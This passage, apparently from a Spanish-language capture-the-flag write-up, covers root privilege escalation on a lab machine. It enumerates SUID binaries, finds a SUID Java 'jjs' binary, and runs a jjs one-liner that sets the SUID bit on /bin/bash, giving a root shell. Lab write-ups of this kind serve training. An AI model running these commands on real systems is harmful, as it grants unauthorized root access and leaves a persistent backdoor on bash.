## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
ls -la ./usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Aqui vemos que tenemos privilegios SUID sobre el binario `jjs` de java. Buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/jjs/#suid)
como escalar el privilegio con jjs. 

```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /bin/bash').waitFor()" | jjs
bash -p
whoami
#Output
root
```

Ya podemos leer el **root.txt**

